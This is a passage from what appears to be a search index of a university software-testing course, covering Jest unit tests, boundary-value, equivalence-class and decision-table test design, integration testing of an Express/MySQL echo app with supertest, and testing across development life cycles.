require('../src/FibSeq.js');\n\ndescribe(\"FibSeq class test\", () =&gt; {\n    const fibSeq = new FibSeq();\n    test (\"first fib num is 1\", () =&gt; {\n        const result = fibSeq.next();\n        expect(result).toBe(1);\n    });\n    test (\"second fib num is 2\", () =&gt; {\n        const result = fibSeq.next();\n        expect(result).toBe(2);\n    });\n})\n</code></pre> Which will run the two tests in sequence.</p> <p>If we want to have the object being reset for each test case.</p> <pre><code>describe(\"FibSeq class test with setup and tear down\", () =&gt;{\n    let fibSeq = null;\n    beforeEach(() =&gt; {\n        fibSeq = new FibSeq();\n    });\n    test (\"first fib num is 1 after reset\", () =&gt; {\n        const result = fibSeq.next();\n        expect(result).toBe(1);\n    });\n    test (\"second fib num is 1 after reset\", () =&gt; {\n        const result = fibSeq.next();\n        expect(result).toBe(1);\n    });\n    afterEach(() =&gt; {\n        fibSeq = null;\n    })\n})\n</code></pre>"},{"location":"notes/l8_1_softwaretesting/#further-readings","title":"Further Readings","text":"<ul> <li>https://www.lambdatest.com/jest</li> </ul>"},{"location":"notes/l9_1_blackbox_unittest/","title":"50.003 - Specification-based Unit Testing","text":""},{"location":"notes/l9_1_blackbox_unittest/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to </p> <ol> <li>Explain the differences between Specification-based testing and code-based testing</li> <li>Identify different levels of testing based on the design abstraction level</li> <li>Develop specification-based unit testing using boundary value testing</li> <li>Develop specification-based unit testing using equivalence class testing</li> <li>Develop specification-based unit testing using decision table testing</li> </ol>"},{"location":"notes/l9_1_blackbox_unittest/#types-of-testing","title":"Types of testing","text":"<p>Depending on how the test cases being identified and defined, we find two types of testings</p>"},{"location":"notes/l9_1_blackbox_unittest/#specification-based-testing","title":"Specification-based Testing","text":"<p>In specification-based testing, the test subject is treated as a function that maps values from its domain (input) into values in its co-domain (output).  The mapping can be defined as a mathemethical relation according to the specification. Specification-based testing is also known as black box testing, as the test cases are defined without the knowledge of the internal implementation of the test subject.  One main advantage of specification-based testing is that it focuses the test effort on the actualization of the specification, i.e. building up confidence. In some literature, specification-based testing is also called functional testing.</p>"},{"location":"notes/l9_1_blackbox_unittest/#code-based-testing","title":"Code-based Testing","text":"<p>On the other hand, one could define test cases by exploiting the knowledge of the internal structure and algorithm used in the target program. This type of testing is called code-based testing. Code-based testing is also known as white box testing. The main advantage of code-based testing is that it tries to ensure all the written codes are covered by the test, i.e. fault finding. In some literature, code-based testing is also called structural testing.</p>"},{"location":"notes/l9_1_blackbox_unittest/#levels-of-testing","title":"Levels of testing","text":"<p>Recall from the earlier lesson, software design often uses abstraction.  Based on different levels of design abstractions, we identify the correspondent level of testings.</p> Design abstraction level Testing level Requirement Specifications System testing Preliminary Design Integration testing Detailed Design Unit testing <ul> <li>Unit testing - test individual smallest units of the system.</li> <li>Integration testing - test related units/subcomponents of the system, which are related (according to the system design)</li> <li>System testing - test the system as a whole, (often according to the user cases).</li> </ul>"},{"location":"notes/l9_1_blackbox_unittest/#unit-testing","title":"Unit Testing","text":"<p>Unit Testing is the test conducted against a software system in the smallest granularity. The smallest granularity is loosely defined. Depending on the choice of detailed design, implementation, programming language and framework, a unit can be either</p> <ol> <li>A function</li> <li>A class</li> <li>A module</li> <li>A UI component</li> </ol>"},{"location":"notes/l9_1_blackbox_unittest/#specification-based-unit-testing","title":"Specification-based Unit Testing","text":"<p>The following are some common techniques of defining test cases of specification-based unit testing</p> <ol> <li>Boundary value testing</li> <li>Equivalence class testing</li> <li>Decision table testing</li> </ol> <p>Based on the type, the domain and the dependencies of the inputs, we shortlist the techniques which more appropriate</p> Assumption on input Techniques Numerical value, ordinal value boundary value, equivalence class Inputs are independent boundary value, equivalence class Inputs are depenedent Decision table"},{"location":"notes/l9_1_blackbox_unittest/#boundary-value-testing","title":"Boundary Value Testing","text":"<p>In Boundary value testing, to define the test cases, we analyse the inputs to the test subject by identifying </p> <ol> <li>what are the input variables.</li> <li>what are the valid ranges.</li> </ol> <p>For example, consider a function <code>f(x1,x2)</code> takes two arguments <code>x1</code> and <code>x2</code> and compute some output. Based on the specification, we note that the following conditions should apply</p> \\[ a \\leq x_1 \\leq b \\] \\[ c \\leq x_2 \\leq d  \\] <p>If we plot out a graph</p> <p></p> <p>The grey region denotes the domain of function <code>f</code>.</p> <p>One way to generate test case based on the given domain of <code>f</code> is to identify the boundaries of the grey region and we pick the values from the boundary The rationale behind the boundary value testing is that errors tend to occur near the extreme values of its inputs, e.g. starting/ending indices of an array, off-by-one errors in a loop, etc. </p>"},{"location":"notes/l9_1_blackbox_unittest/#normal-boundary-value-testing","title":"Normal Boundary Value Testing","text":"<p>We consider the following two assumptions.</p> <ol> <li>assuming that our source language is strongly type and the type checker would reject values of the inputs out side of the domain.</li> <li>assuming when an error occurs it is solely caused by one of the inputs but not both.</li> </ol> <p>With these two assumptions, we can select values as input for testing as </p> \\[ \\begin{array}{c} (x^{min}_1, x^{mean}_2) \\\\ (x^{min}_1+1, x^{mean}_2) \\\\ (x^{mean}_1, x^{mean}_2) \\\\  (x^{max}_1-1, x^{mean}_2) \\\\ (x^{max}_1, x^{mean}_2) \\\\ (x^{mean}_1, x^{min}_2) \\\\ (x^{mean}_1, x^{min}_2+1) \\\\ (x^{mean}_1, x^{max}_2-1) \\\\ (x^{mean}_1, x^{max}_2) \\end{array} \\] <p>where  \\(x^{min}_1 = a, x^{max}_1 = b, x^{mean}_1 = (b-a)/2\\) \\(x^{min}_2 = c, x^{max}_2 = d, x^{mean}_2 = (d-c)/2\\)</p> <p></p>"},{"location":"notes/l9_1_blackbox_unittest/#example","title":"Example","text":"<p>Consider the following function </p> <pre><code>/**\n * \n * @param {number} h - the current time in source timezone, in hour, in range of [0,23]\n * @param {number} stz - the source timezone, in range of [-12, +14]\n * timezone list https://www.ibm.com/docs/en/cloudpakw3700/2.3.0.0?topic=SS6PD2_2.3.0/doc/psapsys_restapi/time_zone_list.htm\n * @param {number} ttz - the target timezone, in range of [-12, +14]\n * @returns {[number,number]} - the current time in target timezone, in hour, in range of [0,23] and a day offset in the range of {-2,-1,0,1,2}  */\nfunction tzconvert(h, stz, ttz) {\n    // not yet implemented\n}\n</code></pre> <p>Applying Normal Boundary Value Test, We identify the following test cases</p> id h stz ttz expected output 1 0 1 1 [0,0] 2 1 1 1 [1,0] 3 11 1 1 [11,0] 4 22 1 1 [22,0] 5 23 1 1 [23,0] 6 11 -12 1 [0,1] 7 11 -11 1 [23,0] 8 11 13 1 [23,-1] 9 11 14 1 [22,-1] 10 11 1 -12 [22,-1] 11 11 1 -11 [23,-1] 12 11 1 13 [23, 0] 13 11 1 14 [0, 1]"},{"location":"notes/l9_1_blackbox_unittest/#robust-boundary-value-testing","title":"Robust Boundary Value Testing","text":"<p>If we drop the first assumption, we should also include the out of range values in our test cases, namely besides the 9 tuples listed earlier, we include the following</p> \\[ \\begin{array}{c} (x^{min}_1-1, x^{mean}_2) \\\\ (x^{max}_1+1, x^{mean}_2) \\\\ (x^{mean}_1, x^{min}_2-1) \\\\ (x^{mean}_1, x^{max}_2+1)  \\end{array} \\] <p></p>"},{"location":"notes/l9_1_blackbox_unittest/#example_1","title":"Example","text":"<p>If we apply Robust Boundary Value Testing to the previous example i.e. <code>tzconvert()</code> function , we identify a few extra test cases as follows</p> id h stz ttz expected output 14 -1 1 1 invalid 15 24 1 1 invalid 16 11 -13 1 invalid 17 11 15 1 invalid 18 11 1 -13 invalid 19 11 1 15 invalid"},{"location":"notes/l9_1_blackbox_unittest/#worst-boundary-value-testing","title":"Worst Boundary Value Testing","text":"<p>If we drop the second assumption, we need to consider those points near the \"corners\".</p> <p>For Normal Worst Boundary Value test, we include</p> \\[ \\begin{array}{c} (x^{min}_1, x^{min}_2) \\\\ (x^{min}_1, x^{min}_2+1) \\\\ (x^{min}_1+1, x^{min}_2) \\\\ (x^{min}_1+1, x^{min}_2+1) \\\\ (x^{max}_1, x^{max}_2) \\\\ (x^{max}_1-1, x^{max}_2) \\\\ (x^{max}_1, x^{max}_2-1) \\\\ (x^{max}_1-1, x^{max}_2-1) \\\\ (x^{min}_1, x^{max}_2) \\\\ (x^{min}_1, x^{max}_2-1) \\\\ (x^{min}_1+1, x^{max}_2) \\\\ (x^{min}_1+1, x^{max}_2-1) \\\\ (x^{max}_1, x^{min}_2) \\\\ (x^{max}_1-1, x^{min}_2) \\\\ (x^{max}_1, x^{min}_2+1) \\\\ (x^{max}_1-1, x^{min}_2+1)  \\end{array} \\] <p></p> <p>For Robust Worst Boundary Value test, we include,</p> \\[ \\begin{array}{c} (x^{min}_1-1, x^{min}_2-1) \\\\ (x^{min}_1-1, x^{min}_2) \\\\ (x^{min}_1-1, x^{min}_2+1) \\\\ (x^{min}_1, x^{min}_2-1) \\\\ (x^{min}_1+1, x^{min}_2-1) \\\\ (x^{max}_1+1, x^{max}_2+1) \\\\  (x^{max}_1+1, x^{max}_2) \\\\  (x^{max}_1+1, x^{max}_2-1) \\\\  (x^{max}_1, x^{max}_2+1) \\\\  (x^{max}_1-1, x^{max}_2+1) \\\\  (x^{min}_1-1, x^{max}_2+1) \\\\  (x^{min}_1, x^{max}_2+1) \\\\  (x^{min}_1+1, x^{max}_2+1) \\\\  (x^{min}_1-1, x^{max}_2) \\\\  (x^{min}_1-1, x^{max}_2-1) \\\\  (x^{max}_1+1, x^{min}_2-1) \\\\  (x^{max}_1+1, x^{min}_2) \\\\  (x^{max}_1+1, x^{min}_2+1) \\\\  (x^{max}_1, x^{min}_2-1) \\\\  (x^{max}_1-1, x^{min}_2-1)  \\end{array} \\] <p></p>"},{"location":"notes/l9_1_blackbox_unittest/#exercises-non-graded","title":"Exercises (Non graded)","text":"<p>Can you find out what are the extra test cases generated if we apply Robust Worst Boundary Value Testing to the <code>tzconvert()</code> function?</p>"},{"location":"notes/l9_1_blackbox_unittest/#equivalence-class-testing","title":"Equivalence Class Testing","text":"<p>One issue with Boundary Value Testing is that there could be too many test cases and many of them could be redundant. </p> <p>The intuition of the equivalence is to avoid redundancy in test cases and yet to offer a complete test.</p> <p>The term equivalence class refers to the math definition of equivalence relation in set theory. Given  Given a domain \\(A\\), a relation \\(R \\subseteq A \\times A\\) is a equivalence relation iff \\(R\\) is reflexive, symmetric and transitive. We can think of \\(R\\) defines a partition peer relation. For instance, we have</p> <ol> <li>for any \\(a \\in A\\), \\(a R\\ a\\), i.e. \\(a_i\\)s are in its own partition</li> <li>for any \\(a_1, a_2 \\in A\\), we have \\(a_1 R\\ a_2\\) implies \\(a_2 R\\ a_1\\), i.e. if \\(a_1\\) in the partition of \\(a_2\\), then \\(a_2\\) is in the parition of \\(a_1\\).</li> <li>for any \\(a_1, a_2, a_3 \\in A\\), we have \\(a_1 R\\ a_2\\) and \\(a_2 R\\ a_3\\) imply \\(a_1 R\\ a_3\\), i.e. if \\(a_1\\) and \\(a_2\\) are in the same partition, and \\(a_2\\) and \\(a_3\\) are in the same partition, then \\(a_1\\) and \\(a_3\\) are in the same partition.</li> </ol> <p>Equivalence class testing means to test with an element from each input partition.  For example, recall the previous example, we would pick one point for each cell in \"grid\"</p> <p></p> <p>Note that in the Strong Robust  Equivalence Class Testing , we would include the dots from the top-left, top-right, bottom-left and bottom-right cells.</p>"},{"location":"notes/l9_1_blackbox_unittest/#example_2","title":"Example","text":"<p>For instance if we apply Equivalence Class Testing (not strong robust) to the <code>tzconvert()</code> function, we only need to consider  test cases <code>3, 14, 15, 16, 17, 18, 19</code>. If we argue that the valid test cases are too fews, we could further partition the valid input region, into 2 or 4 sub regions. </p> <p>As we can observe equivalence class testing help to reduce the number of cases based on the assumption that data points in the same partition yield the same outcome. Its reliability depends on how to partitions.</p>"},{"location":"notes/l9_1_blackbox_unittest/#decision-table-testing","title":"Decision Table Testing","text":"<p>When there exists some dependency among the inputs, it is more applicable to use Decision Table Testing.</p> <p>Consider the following function</p> <pre><code>/**\n * \n * @param {number} d - the day in digit, [1,31]\n * @param {number} m - the month in digit, [1,12]\n * @param {number} y - the year in digit, [0,inf)\n * @returns {[number,number,number]} - the next day in date [day,month,year] \n */\nfunction nextdate(d,m,y) {\n    // TODO\n}\n</code></pre> <p>Applying boundary value testing and equivalence class testing might not make too much sense in this case, since the domain (partitions) are not well defined, e.g. there are too many special cases. For instance,</p> <ol> <li>Feb 28 days in non-leap years, 29 days in leap years; </li> <li>Jan, Mar, May, Jul, Aug, Oct, Dec have 31 days, while Apr, Jun, Sep and Nov have 30 days;</li> <li>Years that not in <code>dd00</code> patterns and can be divisible by 4 are leap years, Given a Year in <code>dd00</code> pattern and <code>dd</code> is divisible by 4 then the year is leap. </li> </ol> <p>Let's define</p> <ul> <li>M1 = {month: month has 30 days}</li> <li>M2 = {month: month has 31 days except December} </li> <li>M3 = {month: month is December}</li> <li>M4 = {month: month is February}</li> <li>D1 = {day: 1 \\(\\leq\\) day \\(\\leq\\) 27}</li> <li>D2 = {day: day = 28}</li> <li>D3 = {day: day = 29}</li> <li>D4 = {day: day = 30}</li> <li>D5 = {day: day = 31}</li> <li>Y1 = {year: year is a leap year}</li> <li>Y2 = {year: year is a common year}</li> </ul> <p>We list down the input constaints combination and output possibilities in a table</p> ~ 1 2 3 4 5 6 7 8 9 10 m M1 M1 M1 M1 M1 M2 M2 M2 M2 M2 d D1 D2 D3 D4 D5 D1 D2 D3 D4 D5 y - - - - - - - - - - actions impossible X d+1 X X X X X X X d=1 X X m+1 X X m=1 y+1 ~ 11 12 13 14 15 16 17 18 19 20 21 22 m M3 M3 M3 M3 M3 M4 M4 M4 M4 M4 M4 M4 d D1 D2 D3 D4 D5 D1 D2 D2 D3 D3 D4 D5 y - - - - - - Y1 Y2 Y1 Y2 - - actions impossible X X X d+1 X X X X X X d=1 X X X m+1 X X m=1 X y+1 X <p>Rows above actions are the combinations of input constgraints Rows below actions are the output possibilities.</p> <p>Based on the above table, we can generate the test cases by randomly generate a set of <code>d</code>, <code>m</code> and <code>y</code> that satisfy the rule id, as follow</p> id d m y expected output rule id 1 10 4 1999 11,4,1999 1 2 28 6 2001 29,6, 2001 2 ..."},{"location":"notes/l9_2_integrationtest/","title":"50.003 - Specification-based Integration Testing and System Testing","text":""},{"location":"notes/l9_2_integrationtest/#learning-outcomes","title":"Learning Outcomes","text":"<ol> <li>Identify the difference between decomposition-based integration testing and call graph-based integration testing.</li> <li>Conduct integration test using Jest.</li> <li>Derive system testing test cases based on the user case documentations.</li> <li>Develop testing strategies based different software development life cycle.</li> </ol>"},{"location":"notes/l9_2_integrationtest/#levels-of-testing","title":"Levels of testing","text":"<p>Recall </p> Design abstraction level Testing level Requirement Specifications System testing Preliminary Design Integration testing Detailed Design Unit testing <ul> <li>Unit testing - test individual smallest units of the system.</li> <li>Integration testing - test related units/subcomponents of the system, which are related (according to the system design)</li> <li>System testing - test the system as a whole, (often according to the user cases).</li> </ul> <p>In this unit, we study integration testing.</p>"},{"location":"notes/l9_2_integrationtest/#integration-test","title":"Integration Test","text":"<p>There are two main approaches of performing integration tests</p> <ul> <li>Decomposition-based testing</li> <li>Call graph-based testing</li> </ul>"},{"location":"notes/l9_2_integrationtest/#decomposition-based-testing","title":"Decomposition-based testing","text":"<p>In Decomposition-based integration testing, we follow the modular structure of the system design. <pre><code>graph\n  Program--&gt;Function1\n  Program--&gt;Function2\n  Program--&gt;Function3\n  Function1--&gt;SubFunction1\n  Function1--&gt;SubFunction2\n  Function2--&gt;SubFunction3\n  Function2--&gt;SubFunction4\n  Function3--&gt;SubFunction5</code></pre> We perform integration test by following the structure. There are two possible directions. 1. Top-down integration testing 1. Bottom-up integration testing</p>"},{"location":"notes/l9_2_integrationtest/#top-down-integration-testing","title":"Top-Down Integration testing","text":"<p>In top-down decomposition-based integration testing, we mock up all the sub-components below the main program, and test the main program.</p> <p><pre><code>graph\n  Program--&gt;Function1*\n  Program--&gt;Function2*\n  Program--&gt;Function3*\n  Function1*--&gt;SubFunction1*\n  Function1*--&gt;SubFunction2*\n  Function2*--&gt;SubFunction3*\n  Function2*--&gt;SubFunction4*\n  Function3*--&gt;SubFunction5*</code></pre> We put an asterix to denote that function is mocked.  After the main program being tested against the mocked functions, we start to replace the mockded codes with the actual codes starting from the first left child until the bottom right child following the breadth first search order. </p> <pre><code>graph\n  Program--&gt;Function1\n  Program--&gt;Function2*\n  Program--&gt;Function3*\n  Function1--&gt;SubFunction1*\n  Function1--&gt;SubFunction2*\n  Function2*--&gt;SubFunction3*\n  Function2*--&gt;SubFunction4*\n  Function3*--&gt;SubFunction5*</code></pre> <p>The rationale of the top-down integration test is that when we encounter an error, the error must be caused by the integration of the newly unmocked code. </p>"},{"location":"notes/l9_2_integrationtest/#bottom-up-integration-testing","title":"Bottom-up Integration testing","text":"<p>Bottom-up decomposition-based integration testing starts from the bottom left-most or the right most leaf function. We test the leaf functions by making use of the unit test codes (now we call it the driver code). </p> <p><pre><code>graph\n  Program*--&gt;Function1*\n  Program*--&gt;Function2*\n  Program*--&gt;Function3*\n  Function1*--&gt;SubFunction1\n  Function1*--&gt;SubFunction2\n  Function2*--&gt;SubFunction3\n  Function2*--&gt;SubFunction4\n  Function3*--&gt;SubFunction5</code></pre> Note that in the above diagram, the components associated with an asterix are yet to be integrated in the integration test. We then move up the structure by integrating the parents of the leaf functions, (and using the unit test code). We repeat the process until we reach the top.</p> <pre><code>graph\n  Program*--&gt;Function1\n  Program*--&gt;Function2\n  Program*--&gt;Function3\n  Function1--&gt;SubFunction1\n  Function1--&gt;SubFunction2\n  Function2--&gt;SubFunction3\n  Function2--&gt;SubFunction4\n  Function3--&gt;SubFunction5</code></pre> <p>By doing so, we need not mock up the code as we can reuse (or modify) the unit-test code as drivers.</p>"},{"location":"notes/l9_2_integrationtest/#limitation","title":"Limitation","text":"<p>The limitation of decomposition-based testing is that the structure is defined by the lexical structure of the source code (definition structure), which often does not reflect the execution and function call relation.</p> <p>For example, recall in our Echo App (the restful API version), we have two major components in the app. By following the code structure we have.</p> <pre><code>graph\n  app--&gt;EchoRouter\n  app--&gt;MessageModel\n  EchoRouter--&gt;get.all\n  EchoRouter--&gt;post.submit\n  MessageModel--&gt;all\n  MessageModel--&gt;insertOne\n  MessageModel--&gt;insertMany</code></pre> <p>However, we find that we hardly have code from app to call MessageModel directly. In most of the situation, the call sequence is app\u2192EchoRouter\u2192MessageModel.</p>"},{"location":"notes/l9_2_integrationtest/#call-graph-based-integration","title":"Call-graph based integration","text":"<p>To address the issue with Decomposition based integration, we define the integration structure by following the call graph. For instance, here is the call graph of our Echo App</p> <p><pre><code>graph\n  app--&gt;EchoRouter\n  EchoRouter--&gt;get.all\n  EchoRouter--&gt;post.submit\n  get.all--&gt;MessageModel.all\n  post.submit--&gt;MessageModel.all\n  post.submit--&gt;MessageModel.insertMany\n  MessageModel.insertMany--&gt; MessageModel.insertOne </code></pre> Note that <code>insertMany()</code> is never used.</p> <p>Now we can apply the similar top-down or bottom-up integration test strategies. </p>"},{"location":"notes/l9_2_integrationtest/#example","title":"Example","text":"<p>We reuse the <code>my_mysql_app</code> developed in the earlier units.  We start by including <code>jest</code> and <code>supertest</code> in the project <pre><code>npm i jest supertest\n</code></pre></p> <p>and modify <code>package.json</code> to change</p> <p><pre><code>  \"scripts\": {\n    \"start\": \"node ./bin/www\"\n  },\n</code></pre> to  <pre><code>  \"scripts\": {\n    \"start\": \"node ./bin/www\",\n    \"test\": \"jest\" // added \n  },\n</code></pre></p> <p>Then we create a sub folder <code>__test__</code> under the project root folder.</p> <p>Now we should have a project folder structure as the following</p> <pre><code>.\n\u251c\u2500\u2500 __test__\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 bin\n\u2502   \u2514\u2500\u2500 www\n\u251c\u2500\u2500 models\n\u2502   \u251c\u2500\u2500 db.js\n\u2502   \u2514\u2500\u2500 message.js\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 public\n\u2502   \u251c\u2500\u2500 images\n\u2502   \u251c\u2500\u2500 javascripts\n\u2502   \u2514\u2500\u2500 stylesheets\n\u2502       \u2514\u2500\u2500 style.css\n\u251c\u2500\u2500 routes\n\u2502   \u251c\u2500\u2500 index.js\n\u2502   \u251c\u2500\u2500 echo.js\n\u2502   \u2514\u2500\u2500 users.js\n\u2514\u2500\u2500 views\n    \u251c\u2500\u2500 error.ejs\n    \u2514\u2500\u2500 index.ejs\n</code></pre>"},{"location":"notes/l9_2_integrationtest/#unit-testing-model-messageall","title":"Unit Testing Model message.all","text":"<p>First we define a unit test on on <code>models/message.js</code>'s function <code>all()</code>.</p> <p>In the <code>__test__</code> folder we add a test file <code>message.test.js</code> with the following content</p> <pre><code>const db = require('../../models/db.js');\nconst message = require('../../models/message.js');\n\nasync function setup() {\n    try {\n        await db.pool.query(`\n            DELETE FROM message;`\n        );\n        await db.pool.query(`\n            INSERT INTO message (msg, time) \n            VALUES ('msg a', '2009-01-01:00:00:00'),\n                   ('msg b', '2009-01-02:00:00:00')\n        `);\n    } catch (error) {\n        console.error(\"setup failed. \" + error);\n        throw error;\n    }\n}\n\nasync function teardown() {\n    try {\n        await db.pool.query(`\n            DELETE FROM message;`\n        );\n        await db.cleanup();\n    } catch (error) {\n        console.error(\"teardown failed. \" + error);\n        throw error;\n    }\n}\n\ndescribe(\"models.message.all() tests\", () =&gt; {\n    beforeAll(async () =&gt; {\n        await setup();\n    });\n    test (\"testing message.all()\", () =&gt; {\n        const expected = [ new message.Message('msg a', new Date('2009-01-01:00:00:00')), \n                           new message.Message('msg b', new Date('2009-01-02:00:00:00'))]\n        const result_promise = message.all();\n        result_promise.then((result) =&gt; {\n            expect(result.sort()).toEqual(expected.sort());\n        });\n    });\n    afterAll(async () =&gt; {\n        await teardown();\n    });\n})\n</code></pre> <p>The <code>setup</code> and <code>teardown</code> define the setup and tear-down routine of this test suite. Note that in the actual project, you might consider backing up and restoring the actual table data in the <code>setup</code> and <code>teardown</code> functions.</p> <p>In the test suite, we define only one test. </p> <p>When we run</p> <pre><code>npm run test message.test.js\n</code></pre> <p>we see</p> <pre><code>&gt; my-mysql-app@0.0.0 test\n&gt; jest --detectOpenHandles message.test.js\n\n  console.log\n    2\n\n      at Object.log (models/message.js:36:17)\n\n PASS  __test__/models/message.test.js\n  models.message.all() tests\n    \u2713 testing message.all() (3 ms)\n\nTest Suites: 1 passed, 1 total\nTests:       1 passed, 1 total\nSnapshots:   0 total\nTime:        0.496 s, estimated 1 s\nRan all test suites matching /message.test.js/i.\n</code></pre>"},{"location":"notes/l9_2_integrationtest/#integration-test-with-echo-router-and-model-messageall","title":"Integration Test with Echo Router and Model message.all","text":"<p>Next we define a bottom-up integration testing by integrating the path from <code>get.all</code> to  <code>message.all()</code>.</p> <pre><code>graph\n  app--&gt;EchoRouter\n  EchoRouter--&gt;get.all\n  get.all--&gt;MessageModel.all</code></pre> <p>In the <code>__test__</code> folder we define a new test file <code>echo.test.js</code> with the following content</p> <pre><code>const db = require('../../models/db.js');\nconst message = require('../../models/message.js');\nconst request = require('supertest')\nconst app = require('../../app');\n\nasync function setup() {\n    try {\n        // TODO backup the existing data to a temp table?\n        await db.pool.query(`\n            DELETE FROM message;`\n        );\n        await db.pool.query(`\n            INSERT INTO message (msg, time) \n            VALUES ('msg a', '2009-01-01:00:00:00'),\n                   ('msg b', '2009-01-02:00:00:00')\n        `);\n    } catch (error) {\n        console.error(\"setup failed. \" + error);\n        throw error;\n    }\n}\n\nasync function teardown() {\n    // TODO restore the table from the backup;\n    try {\n        await db.pool.query(`\n            DELETE FROM message;`\n        );\n        await db.cleanup();\n    } catch (error) {\n        console.error(\"teardown failed. \" + error);\n        throw error;\n    }\n}\n\ndescribe(\"routes.echo endpoint integration tests\", () =&gt; {\n    beforeAll(async () =&gt; {\n        await setup();\n    });\n    test (\"testing /echo/all\", async () =&gt; {\n        const res = await request(app).get('/echo/all');\n        const expected = [ new message.Message('msg a', new Date('2009-01-01:00:00:00')), \n                           new message.Message('msg b', new Date('2009-01-02:00:00:00'))]\n        expect(res.statusCode).toEqual(200);\n        const json = JSON.parse(res.text);\n        const received = [];\n        for (let i in json) {\n            received.push(new message.Message(json[i].msg, new Date(json[i].time)))\n        }\n        expect(received.sort()).toEqual(expected.sort());\n    });\n    afterAll(async () =&gt; {\n        await teardown();\n    });\n\n})\n</code></pre> <p>The setup and teardown routines are similar to the unit test for <code>message.all()</code>.  The only difference is that in the test case, we initiate the call from the app level which trigger the router handler with URL path <code>/echo/all</code>. We then extract the returned text returned from the handler, and parse it back to a json object. Finally we compared the received results (created from <code>json</code>) and the expected result.</p> <p>When we run</p> <pre><code>npm run test echo.test.js\n</code></pre> <p>we see <pre><code>&gt; my-mysql-app@0.0.0 test\n&gt; jest --detectOpenHandles echo.test.js\n\n  console.log\n    2\n\n      at Object.log (models/message.js:36:17)\n\nGET /echo/all 200 28.616 ms - 101\n PASS  __test__/models/echo.test.js\n  routes.echo endpoint integration tests\n    \u2713 testing /echo/all (66 ms)\n\nTest Suites: 1 passed, 1 total\nTests:       1 passed, 1 total\nSnapshots:   0 total\nTime:        0.678 s, estimated 1 s\nRan all test suites matching /echo.test.js/i.\n</code></pre></p>"},{"location":"notes/l9_2_integrationtest/#cyclic-call-graph","title":"Cyclic call-graph","text":"<p>In case that the call-graph contains cycles, i.e. due to mutual recursion, we have to test the strong connected components as a unit</p>"},{"location":"notes/l9_2_integrationtest/#pairwise-testing","title":"Pairwise testing","text":"<p>Besides top-down or bottom-up strategies, an alternative is to perform pair-wise testing. The idea is to test each edge of the call-graph. Similar to bottom-up strategy, we could convert unit tests for invidiual unit into test drivers for every pair, saving some effort in mock-up effort. One advantage of pairwise testing is to higher degree of fault isolation. </p>"},{"location":"notes/l9_2_integrationtest/#system-testing","title":"System Testing","text":"<p>System testing is often less formal compared to unit testing and integration test. Test cases of the system testing can be derived from </p> <ul> <li>The use case documents and use case diagrams</li> <li>The sequence diagrams</li> <li>The state machine diagrams</li> </ul> <p>For instance given the following use case document </p> Use case ID UC 1 Use case name Create New Message Objective The user creates a new message which will be stored in the Echo app DB Pre-conditions nil Primary Actor User Secondary Actor nil Normal Flow 1. User navigates to <code>https://localhost:3000/echo/</code> 2. User enters a new text message and submits 3. Echo App receives the message and inserts it into the database 4. Echo App returns the list of all messages in the database and display in the UI Alternative Flow Post-conditions nil <p>We can define a system test case as follows</p> Test case ID TC 1 Test case name Create New Message Objective The user creates a new message which will be stored in the Echo app DB Pre-conditions nil Event Sequence Input User navigates to <code>https://localhost:3000/echo/</code> Output The new message form is displayed Input User enters a new text message and submits Output The list of messages in the system is returned and rendered, which includes the newly submitted message. Post-conditions nil"},{"location":"notes/l9_2_integrationtest/#life-cycle-based-testing","title":"Life-cycle based testing","text":"<p>In this section, we discuss how to incoporate the testing activities along with the software development life-cycle.</p>"},{"location":"notes/l9_2_integrationtest/#waterfall-testing","title":"Waterfall testing","text":"<p>In Walterfall software life-cycle, we could easily incoprate the testing activities as the last few phases.</p> <pre><code>graph\n  A(\"Requirements Specification\") --&gt; B\n  B(\"Analysis\") --&gt;  C\n  C(\"Design\") --&gt; D\n  D(\"Coding\") --&gt; E\n  E(\"Unit Testing\") --&gt; F\n  F(\"Integration Test\") --&gt; G(\"System Test\")</code></pre> <p>As highlighted in the earlier lesson, Waterfall testing as part of the waterfall development life-cycle, suffers from the long feedback interval issues.</p>"},{"location":"notes/l9_2_integrationtest/#iterative-life-cycle-testing","title":"Iterative Life Cycle testing","text":"<p>In Iterative Software Dvelopment Life Cycle, we break and stage different parts/levels of the system components to be developed in different iterations. </p> <pre><code>graph\n  Z(\"Previous Iteration\") --&gt; A\n  A(\"Specification\") --&gt; B\n  B(\"Analysis\") --&gt;  C\n  C(\"Design\") --&gt; D\n  D(\"Coding\") --&gt; E\n  E(\"Unit Testing\") --&gt; F\n  F(\"Integration Testing\") --&gt; G\n  G(\"Regression Testing\") --&gt; H\n  H(\"Progression Testing\") --&gt; I(\"Next Iteration\")</code></pre> <p>In terms of testing, we follow a similar structure of waterfall testing for each iteration, except that towards the end, we conduct regression testing and  progression testing instead of system test. </p> <ul> <li>Regression testing - to re-test the test cases defined and passed in the previous iterations.</li> <li>Progress testing - to pre-test the test cases defined in the upcoming iterations, some of them should fail.  </li> </ul>"},{"location":"notes/l9_2_integrationtest/#agile-testing","title":"Agile Testing","text":"<p>Recall in Agile development, the development plans are engineered to focus</p> <ul> <li>Customer-driven</li> <li>Bottom\u2013up development</li> <li>Flexibility with respect to changing requirements</li> <li>Early delivery of fully functional components</li> </ul> <p>Agile Development is often divided into sprints. In each sprints, development team liaise with the project users to identify the deliverables that should be delivered in the particular sprint. In the testing aspect, the testing must be aligned with the user story development for each sprint. </p> <pre><code>graph\n  A(\"Customer Expectation\")--&gt;B\n  B(\"Iteration Plan\")--&gt;C\n  C(\"User Story\")--&gt;D\n  D(\"Design\")--&gt;E\n  E(\"Coding\")--&gt;F\n  F(\"Unit Testing\")--&gt;G\n  G(\"Integration Testing\")--&gt;H\n  H(\"Regression Testing\")--&gt;C</code></pre>"},{"location":"notes/l9_2_integrationtest/#futher-reading","title":"Futher Reading","text":"<ol> <li><code>https://lambtsa.medium.com/rest-api-with-express-router-jest-and-supertest-10832a23016f</code></li> <li><code>https://medium.com/geekculture/testing-express-js-with-jest-8c6855945f03</code></li> </ol>"}]}